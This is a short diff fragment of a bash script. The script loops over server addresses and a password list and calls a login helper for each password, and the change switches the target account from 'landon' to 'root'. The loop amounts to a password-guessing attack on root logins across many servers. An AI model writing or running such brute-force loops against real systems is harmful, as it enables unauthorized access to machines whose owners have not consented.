@@ -25,7 +25,7 @@ for SERVER in "${theips[@]}"
 do
 	for PASS in "${passdapass[@]}"
 	do
-		bash thelinuxlogin landon $PASS $SERVER
+		bash thelinuxlogin root $PASS $SERVER
 	done
 done
 exit 0
